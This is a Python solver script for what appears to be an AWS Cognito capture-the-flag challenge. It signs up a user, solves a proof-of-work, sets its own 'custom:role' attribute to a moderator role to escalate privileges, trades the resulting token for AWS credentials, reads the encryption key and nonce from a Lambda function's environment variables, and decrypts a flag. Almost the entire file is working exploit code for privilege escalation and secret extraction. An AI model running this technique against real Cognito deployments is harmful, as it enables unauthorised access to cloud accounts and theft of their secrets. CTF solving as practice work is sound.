#!/usr/bin/env python3

import base64
import binascii
import datetime
import hashlib
import hmac
import re
import boto3
import os
import six
import argparse
import sys
import requests
import re

from Crypto.Cipher import AES

# https://github.com/aws/amazon-cognito-identity-js/blob/master/src/AuthenticationHelper.js#L22
n_hex = 'FFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD1' + '29024E088A67CC74020BBEA63B139B22514A08798E3404DD' + \
        'EF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245' + 'E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7ED' + \
        'EE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3D' + 'C2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F' + \
        '83655D23DCA3AD961C62F356208552BB9ED529077096966D' + '670C354E4ABC9804F1746C08CA18217C32905E462E36CE3B' + \
        'E39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9' + 'DE2BCBF6955817183995497CEA956AE515D2261898FA0510' + \
        '15728E5A8AAAC42DAD33170D04507A33A85521ABDF1CBA64' + 'ECFB850458DBEF0A8AEA71575D060C7DB3970F85A6E1E4C7' + \
        'ABF5AE8CDB0933D71E8C94E04A25619DCEE3D2261AD2EE6B' + 'F12FFA06D98A0864D87602733EC86A64521F2B18177B200C' + \
        'BBE117577A615D6C770988C0BAD946E208E24FA074E5AB31' + '43DB5BFCE0FD108E4B82D120A93AD2CAFFFFFFFFFFFFFFFF'
# https://github.com/aws/amazon-cognito-identity-js/blob/master/src/AuthenticationHelper.js#L49
g_hex = '2'
info_bits = bytearray('Caldera Derived Key', 'utf-8')


def hash_sha256(buf):
    """AuthenticationHelper.hash"""
    a = hashlib.sha256(buf).hexdigest()
    return (64 - len(a)) * '0' + a


def hex_hash(hex_string):
    return hash_sha256(bytearray.fromhex(hex_string))


def hex_to_long(hex_string):
    return int(hex_string, 16)


def long_to_hex(long_num):
    return '%x' % long_num


def get_random(nbytes):
    random_hex = binascii.hexlify(os.urandom(nbytes))
    return hex_to_long(random_hex)


def pad_hex(long_int):
    """
    Converts a Long integer (or hex string) to hex format padded with zeroes for hashing
    :param {Long integer|String} long_int Number or string to pad.
    :return {String} Padded hex string.
    """
    if not isinstance(long_int, six.string_types):
        hash_str = long_to_hex(long_int)
    else:
        hash_str = long_int
    if len(hash_str) % 2 == 1:
        hash_str = '0%s' % hash_str
    elif hash_str[0] in '89ABCDEFabcdef':
        hash_str = '00%s' % hash_str
    return hash_str


def compute_hkdf(ikm, salt):
    """
    Standard hkdf algorithm
    :param {Buffer} ikm Input key material.
    :param {Buffer} salt Salt value.
    :return {Buffer} Strong key material.
    @private
    """
    prk = hmac.new(salt, ikm, hashlib.sha256).digest()
    info_bits_update = info_bits + bytearray(chr(1), 'utf-8')
    hmac_hash = hmac.new(prk, info_bits_update, hashlib.sha256).digest()
    return hmac_hash[:16]


def calculate_u(big_a, big_b):
    """
    Calculate the client's value U which is the hash of A and B
    :param {Long integer} big_a Large A value.
    :param {Long integer} big_b Server B value.
    :return {Long integer} Computed U value.
    """
    u_hex_hash = hex_hash(pad_hex(big_a) + pad_hex(big_b))
    return hex_to_long(u_hex_hash)


class AWSSRP(object):

    NEW_PASSWORD_REQUIRED_CHALLENGE = 'NEW_PASSWORD_REQUIRED'
    PASSWORD_VERIFIER_CHALLENGE = 'PASSWORD_VERIFIER'

    def __init__(self, username, password, pool_id, client_id, pool_region=None,
                 client=None, client_secret=None):
        if pool_region is not None and client is not None:
            raise ValueError("pool_region and client should not both be specified "
                             "(region should be passed to the boto3 client instead)")

        self.username = username
        self.password = password
        self.pool_id = pool_id
        self.client_id = client_id
        self.client_secret = client_secret
        self.client = client if client else boto3.client('cognito-idp', region_name=pool_region)
        self.big_n = hex_to_long(n_hex)
        self.g = hex_to_long(g_hex)
        self.k = hex_to_long(hex_hash('00' + n_hex + '0' + g_hex))
        self.small_a_value = self.generate_random_small_a()
        self.large_a_value = self.calculate_a()

    def generate_random_small_a(self):
        """
        helper function to generate a random big integer
        :return {Long integer} a random value.
        """
        random_long_int = get_random(128)
        return random_long_int % self.big_n

    def calculate_a(self):
        """
        Calculate the client's public value A = g^a%N
        with the generated random number a
        :param {Long integer} a Randomly generated small A.
        :return {Long integer} Computed large A.
        """
        big_a = pow(self.g, self.small_a_value, self.big_n)
        # safety check
        if (big_a % self.big_n) == 0:
            raise ValueError('Safety check for A failed')
        return big_a

    def get_password_authentication_key(self, username, password, server_b_value, salt):
        """
        Calculates the final hkdf based on computed S value, and computed U value and the key
        :param {String} username Username.
        :param {String} password Password.
        :param {Long integer} server_b_value Server B value.
        :param {Long integer} salt Generated salt.
        :return {Buffer} Computed HKDF value.
        """
        u_value = calculate_u(self.large_a_value, server_b_value)
        if u_value == 0:
            raise ValueError('U cannot be zero.')
        username_password = '%s%s:%s' % (self.pool_id.split('_')[1], username, password)
        username_password_hash = hash_sha256(username_password.encode('utf-8'))

        x_value = hex_to_long(hex_hash(pad_hex(salt) + username_password_hash))
        g_mod_pow_xn = pow(self.g, x_value, self.big_n)
        int_value2 = server_b_value - self.k * g_mod_pow_xn
        s_value = pow(int_value2, self.small_a_value + u_value * x_value, self.big_n)
        hkdf = compute_hkdf(bytearray.fromhex(pad_hex(s_value)),
                            bytearray.fromhex(pad_hex(long_to_hex(u_value))))
        return hkdf

    def get_auth_params(self):
        auth_params = {'USERNAME': self.username,
                       'SRP_A': long_to_hex(self.large_a_value)}
        if self.client_secret is not None:
            auth_params.update({
                "SECRET_HASH":
                self.get_secret_hash(self.username, self.client_id, self.client_secret)})
        return auth_params

    @staticmethod
    def get_secret_hash(username, client_id, client_secret):
        message = bytearray(username + client_id, 'utf-8')
        hmac_obj = hmac.new(bytearray(client_secret, 'utf-8'), message, hashlib.sha256)
        return base64.standard_b64encode(hmac_obj.digest()).decode('utf-8')

    def process_challenge(self, challenge_parameters):
        user_id_for_srp = challenge_parameters['USER_ID_FOR_SRP']
        salt_hex = challenge_parameters['SALT']
        srp_b_hex = challenge_parameters['SRP_B']
        secret_block_b64 = challenge_parameters['SECRET_BLOCK']
        # re strips leading zero from a day number (required by AWS Cognito)
        timestamp = re.sub(r" 0(\d) ", r" \1 ",
                           datetime.datetime.utcnow().strftime("%a %b %d %H:%M:%S UTC %Y"))
        hkdf = self.get_password_authentication_key(user_id_for_srp,
                                                    self.password, hex_to_long(srp_b_hex), salt_hex)
        secret_block_bytes = base64.standard_b64decode(secret_block_b64)
        msg = bytearray(self.pool_id.split('_')[1], 'utf-8') + bytearray(user_id_for_srp, 'utf-8') + \
            bytearray(secret_block_bytes) + bytearray(timestamp, 'utf-8')
        hmac_obj = hmac.new(hkdf, msg, digestmod=hashlib.sha256)
        signature_string = base64.standard_b64encode(hmac_obj.digest())
        response = {'TIMESTAMP': timestamp,
                    'USERNAME': user_id_for_srp,
                    'PASSWORD_CLAIM_SECRET_BLOCK': secret_block_b64,
                    'PASSWORD_CLAIM_SIGNATURE': signature_string.decode('utf-8')}
        if self.client_secret is not None:
            response.update({
                "SECRET_HASH":
                self.get_secret_hash(self.username, self.client_id, self.client_secret)})
        return response

    def authenticate_user(self, client=None):
        boto_client = self.client or client
        auth_params = self.get_auth_params()
        response = boto_client.initiate_auth(
            AuthFlow='USER_SRP_AUTH',
            AuthParameters=auth_params,
            ClientId=self.client_id
        )
        if response['ChallengeName'] == self.PASSWORD_VERIFIER_CHALLENGE:
            challenge_response = self.process_challenge(response['ChallengeParameters'])
            tokens = boto_client.respond_to_auth_challenge(
                ClientId=self.client_id,
                ChallengeName=self.PASSWORD_VERIFIER_CHALLENGE,
                ChallengeResponses=challenge_response)

            if tokens.get('ChallengeName') == self.NEW_PASSWORD_REQUIRED_CHALLENGE:
              print('Change password before authenticating')
              exit(1)

            return tokens
        else:
            raise NotImplementedError('The %s challenge is not supported' % response['ChallengeName'])

    def set_new_password_challenge(self, new_password, client=None):
        boto_client = self.client or client
        auth_params = self.get_auth_params()
        response = boto_client.initiate_auth(
            AuthFlow='USER_SRP_AUTH',
            AuthParameters=auth_params,
            ClientId=self.client_id
        )
        if response['ChallengeName'] == self.PASSWORD_VERIFIER_CHALLENGE:
            challenge_response = self.process_challenge(response['ChallengeParameters'])
            tokens = boto_client.respond_to_auth_challenge(
                ClientId=self.client_id,
                ChallengeName=self.PASSWORD_VERIFIER_CHALLENGE,
                ChallengeResponses=challenge_response)

            if tokens['ChallengeName'] == self.NEW_PASSWORD_REQUIRED_CHALLENGE:
                challenge_response = {
                    'USERNAME': auth_params['USERNAME'],
                    'NEW_PASSWORD': new_password
                }
                new_password_response = boto_client.respond_to_auth_challenge(
                    ClientId=self.client_id,
                    ChallengeName=self.NEW_PASSWORD_REQUIRED_CHALLENGE,
                    Session=tokens['Session'],
                    ChallengeResponses=challenge_response)
                return new_password_response
            return tokens
        else:
            raise NotImplementedError('The %s challenge is not supported' % response['ChallengeName'])

def sign_up(client, client_id, username, password):
    try:
        resp = client.sign_up(
            ClientId=client_id,
            Username=username,
            Password=password,
        )
    except Exception as err:
        error = repr(err)
        pass
    chall_re = r'challenge\:(.*)\-'
    diff_re = r'difficulty\:(.*)\.'
    chall_match = re.findall(chall_re, error, re.MULTILINE)
    diff_match = re.findall(diff_re, error, re.MULTILINE)
    chall = chall_match[0].strip()
    diff = diff_match[0].strip()
    
    print(f'Solving {chall} (diff {diff})!')

    solution = solve_pow(chall, int(diff))
    try:
        resp = client.sign_up(
            ClientId=client_id,
            Username=username,
            Password=password,
            UserAttributes=[
                {
                    'Name': 'custom:proof_of_work',
                    'Value': str(solution)
                }
            ]
        )
    except Exception as err:
        print(f"Somethign went wrong with sign-up: {err}")
        sys.exit(1)
    print('Signed-up!')

def is_valid(digest, difficulty, zeros):
    if sys.version_info.major == 2:
        digest = [ord(i) for i in digest]
    bits = ''.join(bin(i)[2:].zfill(8) for i in digest)
    return bits[:difficulty] == zeros

def solve_pow(prefix, difficulty):
    zeros = '0' * difficulty
    i = 0
    while True:
        i += 1
        s = prefix + str(i)
        if is_valid(hashlib.sha256(s.encode()).digest(), difficulty, zeros):
            return i

def modify_attributes(client, role, token):
    try:
        resp = client.update_user_attributes(
            UserAttributes=[
                {
                    'Name':'custom:role',
                    'Value':role
                },
            ],
            AccessToken=token
        )
    except Exception as err:
        print(f"Somethign went wrong with modifying attributes: {err}")
        sys.exit(1)
    print('Attributes modified!')

def get_auth_credentials(client, logins, ipool_id):
    try:
        resp = client.get_id(
            IdentityPoolId=ipool_id,
            Logins=logins
        )
    except Exception as err:
        print(f"Something went wrong with getting IdentityPool ID: {err}")
        sys.exit(1)

    identity_id = resp['IdentityId']
    print(f'Got Identity Pool ID: {identity_id}')
    try:
        resp = client.get_credentials_for_identity(
            IdentityId=identity_id,
            Logins=logins
        )
    except Exception as err:
        print(f"Something went wrong with getting credentials: {err}")
        sys.exit(1)

    credentials = resp['Credentials']
    return credentials

def get_encrypted_flag(url, token):
    try:
        resp = requests.get(url, headers={'Authorization': token})
        if resp.text.startswith('User is not'):
            print('User is not authorized to get enc flag')
            sys.exit(1)
        tag = resp.text[:32]
        flag = resp.text[32:]
    except Exception as err:
        print(f'Something went wrong when extracting encrypted flag: {err}')
        sys.exit(1)

    return tag, flag

def get_key(client, lambda_name):
    for i in range(1,50):
        try:
            resp = client.get_function(
                FunctionName=f'{lambda_name}',
                Qualifier=str(i)
            )
            if resp:
                break
        except Exception as err:
            if i == 9:
                print(f'Something went wrong when extracting encryption params from lambda: {err}')
                sys.exit(1)
            pass

    key = resp['Configuration']['Environment']['Variables']['KEY']
    nonce = resp['Configuration']['Environment']['Variables']['NONCE']
    return key, nonce

def decrypt(key, nonce, tag, flag):
    key = bytes.fromhex(key)
    nonce = bytes.fromhex(nonce)
    tag = bytes.fromhex(tag)
    flag = bytes.fromhex(flag)

    cipher = AES.new(key, AES.MODE_EAX, nonce)
    dec_flag = cipher.decrypt_and_verify(flag, tag)

    print('DECRYPTED!')
    print(dec_flag.decode())

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument("--region", help="Region", default="eu-west-1")
    parser.add_argument("--userpool_id", help="UserPool ID")
    parser.add_argument("--client_id", help="Client ID")
    parser.add_argument("--identitypool_id", help="IdentityPool ID")
    parser.add_argument("--role", help="Name of mod role", default='fishy_moderator')
    parser.add_argument("--username", help="Username for solver", default="solver")
    parser.add_argument("--password", help="Password for solver", default="S3cr3tPassw0rd!")
    parser.add_argument("--lname", help="Lambda function name", default="FlagLambda")
    parser.add_argument("--flagurl", help="URL to encrypted flag")
    parser.add_argument("--print_tokens", help="Will print tokens!", action='store_true')
    parser.add_argument("--without_user", help="Disable sign-up", action='store_true')
    args = parser.parse_args()

    region = args.region
    upool_id = args.userpool_id
    client_id = args.client_id
    ipool_id = args.identitypool_id
    username = args.username
    password = args.password
    role = args.role
    furl = args.flagurl
    lambda_name = args.lname
    print_tokens = args.print_tokens
    without_user = args.without_user
    client = boto3.client('cognito-idp', region_name=region)
    
    if not without_user:
        sign_up(client, client_id, username, password)

    srp = AWSSRP(
        username=username,
        password=password,
        pool_id=upool_id,
        client_id=client_id,
        client=client
    )
    resp = srp.authenticate_user()
    print('Authenticated!')
    access_token = resp['AuthenticationResult']['AccessToken']
    id_token = resp['AuthenticationResult']['IdToken']

    if print_tokens:
        print(f"Access token: {access_token}")
        print(f"ID token: {id_token}")
    
    modify_attributes(client, role, access_token)
    resp = srp.authenticate_user()
    print('ReAuthenticated!')
    access_token = resp['AuthenticationResult']['AccessToken']
    id_token = resp['AuthenticationResult']['IdToken']

    if print_tokens:
        print(f"Access token: {access_token}")
        print(f"ID token: {id_token}")

    id_client = boto3.client('cognito-identity', region_name=region)
    logins = {
        f'cognito-idp.{region}.amazonaws.com/{upool_id}' : id_token
    }

    credentials = get_auth_credentials(id_client, logins, ipool_id)
    access_key = credentials['AccessKeyId']
    secret_key = credentials['SecretKey']
    secret_token = credentials['SessionToken']

    print('Got credentials to AWS!')
    if print_tokens:
        print(f'Access Key: {access_key}')
        print(f'Secret Key: {secret_key}')
        print(f'Secret Token: {secret_token}')

    tag, enc_flag = get_encrypted_flag(furl, access_token)
    print(f'Got encrypted flag ({enc_flag}) and tag ({tag})')

    lambda_client = boto3.client(
        'lambda',
        aws_access_key_id=access_key,
        aws_secret_access_key=secret_key,
        aws_session_token=secret_token
    )

    key, nonce = get_key(lambda_client, lambda_name)
    print(f'Got key ({key}) and nonce ({nonce})')

    decrypt(key, nonce, tag, enc_flag)